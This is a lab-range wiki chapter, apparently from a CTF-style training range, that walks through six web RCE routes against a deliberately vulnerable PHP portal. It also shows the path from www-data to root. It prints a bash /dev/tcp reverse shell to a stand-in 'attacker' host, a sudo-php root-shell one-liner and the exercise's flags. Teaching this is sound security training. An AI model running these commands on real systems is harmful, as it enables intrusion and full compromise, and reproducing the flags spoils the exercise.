# Chapter 09 — "Foothold" (Web RCE)

> **Host:** `hollow-portal-01` (compose service `target-web`)
> **Entry point:** the web app at `http://127.0.0.1:8080/` — **no SSH, no account**
> **Objective:** get RCE → reverse shell as `www-data` → **root**, read `/root/flag.txt`
> **Difficulty:** ★☆☆☆ → ★★★☆
> **Flags:** `/var/www/flag.txt` → `R2R{w3b_rce_is_your_front_d00r}` (foothold) · `/root/flag.txt` → `R2R{www_data_t0_r00t_full_k1ll_cha1n}` (root)

New to the range? Read [[Getting-Started]] and [[How-A-Chapter-Works]] first. This is the one chapter that starts you **outside**, with nothing but a browser.

## Mission brief

Every other chapter hands you `labuser1`. This one hands you a URL. Hollow Industries exposed an internal file-sharing and support portal — **Hollow Share**, Apache + PHP 8 — to the perimeter. Your job is to turn the web app into code execution, catch a reverse shell as `www-data`, and climb to root.

> **The whole idea in one line:** a web app is a program that runs attacker input. Find the input that reaches a shell, an `include()`, a template engine, or `unserialize()`, and you are running code on the server. The reverse shell is the **foothold**, not the finish.

## The web attack surface in one paragraph

Six features each take your input to a dangerous sink: the filesystem-as-code (upload a script and request it), a shell (`system()`), `include()` (LFI), a template compiler (SSTI), and `unserialize()` (object injection). Every route ends the same way — your code runs as `www-data` — and then one `sudo` misconfig finishes the climb to root. You only need one route to win; a good operator maps all six, because each is a different root cause with a different fix.

## Recon starter

From the attacker box (or your host browser + Burp):

```bash
curl -s http://target-web/            # the landing page lists every feature
```

Then, for each input, ask:

| # | Question | Station |
|---|---|---|
| 1 | Does my file land somewhere the server runs it as code? | **A** (and **B** if it's "filtered") |
| 2 | Does my value reach a shell (`system`, backticks)? | **C** |
| 3 | Does my value get `include`d as a file? | **D** |
| 4 | Does my text get rendered as a template (`{{7*7}}` → 49)? | **E** |
| 5 | Is a serialized object (cookie/param) `unserialize()`d? | **F** |

## The six routes to RCE

| # | Feature | What you'll find | Difficulty |
|---|---|---|:---:|
| [[A\|C09-Station-A-Unrestricted-Upload]] | Upload | no validation — upload `shell.php`, browse to it | ★☆☆☆ |
| [[B\|C09-Station-B-Upload-Filter-Bypass]] | Share image | deny-list + `Content-Type` check, both bypassable | ★★☆☆ |
| [[C\|C09-Station-C-Command-Injection]] | Network tools | `host` spliced into a shell command | ★★☆☆ |
| [[D\|C09-Station-D-LFI-RCE]] | Help viewer | `?page=` includes any file → log poison / wrappers | ★★★☆ |
| [[E\|C09-Station-E-SSTI-Twig]] | Greeting preview | your text compiled as a Twig template | ★★★☆ |
| [[F\|C09-Station-F-PHP-Deserialization]] | Preferences cookie | serialized object `unserialize()`d → gadget | ★★★☆ |

## The capstone — all six converge here

Every route lands you as `www-data`. Then:

```bash
sudo -l                                   # (ALL) NOPASSWD: /usr/bin/php
sudo /usr/bin/php -r 'system("/bin/sh");' # root shell
cat /root/flag.txt                        # R2R{www_data_t0_r00t_full_k1ll_cha1n}
```

An interpreter you can `sudo` is a root shell — the same lesson as [[C03-Station-A-GTFOBins-sudo-find]].

## Reverse shells are the point

Each route gives command execution; turn it into an interactive shell. The full catalog (bash `/dev/tcp`, `nc`, `mkfifo`, `python3`, `php`, `perl`, `socat`), the TTY upgrade, and listener setup live on [[Reverse-Shell-Reference]].

```bash
# attacker:
nc -lvnp 4444
# payload the web app runs (bash, not sh — /dev/tcp is a bash feature):
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

## How to connect

```bash
make up-web
make attacker
# the app is reachable at http://127.0.0.1:8080/ on your host (point Burp here)
# and at http://target-web/ from the attacker box, over labnet
```

## How to reset

```bash
make reset-web
```

## The through-line

Validate and encode everything that crosses a boundary. Never let user input choose a filename-as-code, reach a shell, name a file to `include`, author a template, or rebuild an object. And never give the web user `sudo` on an interpreter. After all six, [[Blue-Team-Playbook]] is the defender's pass.

## Next

Start with [[C09-Station-A-Unrestricted-Upload]]. Then read [[Reverse-Shell-Reference]] and keep it open as you work the harder routes.
